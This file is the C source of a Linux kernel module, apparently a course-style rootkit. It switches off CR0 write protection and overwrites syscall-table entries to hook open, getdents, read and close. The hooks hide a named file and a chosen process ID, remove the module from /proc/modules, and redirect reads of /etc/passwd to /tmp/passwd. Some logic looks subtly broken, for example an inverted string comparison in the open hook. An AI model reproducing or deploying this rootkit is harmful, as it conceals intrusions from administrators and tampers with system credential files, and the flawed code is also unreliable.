#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>



//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

static char * sneaky_pid = "";

module_param(sneaky_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

MODULE_PARM_DESC(sneaky_pid, "Sneaky proc PID");

static int fd_tmp = -1;

//a mimic to linux dirent
struct _dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[256];
};

typedef struct _dirent dirent;

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
asmlinkage int (*original_close)(int fd);


asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  //printk(KERN_INFO "Very, very Sneaky!\n");
  if (strcmp("/etc/passwd", pathname)) {
    char tmp_buf[sizeof("/etc/passwd")];
    int status;
    if (copy_from_user(tmp_buf, pathname, sizeof(tmp_buf)))
      return -EFAULT;
  

    if (!copy_to_user(pathname, "/tmp/passwd", sizeof("/tmp/passwd"))) {
      printk(KERN_INFO "Substitued\n");
    }
    
    status = original_call(pathname, flags);
    if (copy_to_user(pathname, tmp_buf, sizeof(tmp_buf))) {}
    return status;
  } else {
    int status = original_call(pathname, flags);
    if (strcmp(pathname, "/proc/modules") == 0) {
      printk(KERN_INFO "Open\n");
      fd_tmp = status;
    }
    return status;
  }
}

asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count) {
  ssize_t ret = original_read(fd, buf, count);
  if ((fd_tmp != -1)) {
    char * conc = strstr(buf, "sneaky_mod");
    if (conc) {
      char* newp = strchr(conc, '\n');
      if (newp) {
	memcpy(conc, newp+1, ret - (int)((newp - (char *)buf)));
	ret = ret - (int) (newp - conc);
      }
    }
  }
  return ret;
}

asmlinkage int sneaky_getdents(unsigned int fd, dirent *dirp, unsigned int count) {
  //printk(KERN_INFO "In sneaky_getdents()\n");
  //printk(KERN_INFO "sneaky_pid %s\n", sneaky_pid);
  int read = original_getdents(fd, dirp, count);
  int pos;
  dirent *d;
  char d_type;

  for (pos = 0; (pos >= 0) && (pos < read);) {
    int reclen_tmp;
    int found = 0;
    d = (dirent *) ((char*) dirp + pos);
    reclen_tmp = (int) d->d_reclen;
    d_type = *((char*) dirp + pos + d->d_reclen - 1);

    if ((d_type == DT_REG) && (strcmp(d->d_name, "sneaky_process")) == 0) {
      printk(KERN_INFO "User try access sneaky file %s\n", d->d_name);
      found = 1;
    } else if ((d_type == DT_DIR) && (strcmp(d->d_name, sneaky_pid)) == 0) {
      printk(KERN_INFO "User try access sneaky pid %s\n", d->d_name);
      found = 1;
    }
    
    if (found) {
      memcpy(d, (char*)d + d->d_reclen, read - (int)(((char*)d + d->d_reclen)- (char*)dirp));
      read -= reclen_tmp;
      break;
    }
    pos += reclen_tmp;
  }
  return read;
}

asmlinkage int sneaky_close(int fd) {
  if (fd == fd_tmp) {
    printk(KERN_INFO "Closing\n");
    fd_tmp = -1;
  }
  return original_close(fd);
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;

  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;

  original_close = (void*)*(sys_call_table + __NR_close);
  *(sys_call_table + __NR_close) = (unsigned long)sneaky_close;
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  printk(KERN_INFO "Sneaky process pid %s.\n", sneaky_pid);
  
  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_close) = (unsigned long)original_close;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

